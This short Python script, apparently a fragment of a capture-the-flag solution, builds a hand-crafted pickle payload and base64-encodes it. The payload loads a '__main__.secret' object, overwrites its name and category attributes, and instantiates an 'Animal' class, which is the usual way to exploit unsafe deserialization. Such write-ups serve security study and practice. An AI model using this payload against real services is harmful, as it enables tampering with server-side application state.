import requests
import pickle
import base64

payload=b'c__main__\nsecret\n(S"name"\nS"foo"\nS"category"\nS"bar"\ndb(S"foo"\nS"bar"\ni__main__\nAnimal\n.'

exp = base64.b64encode(payload).decode()
print(exp)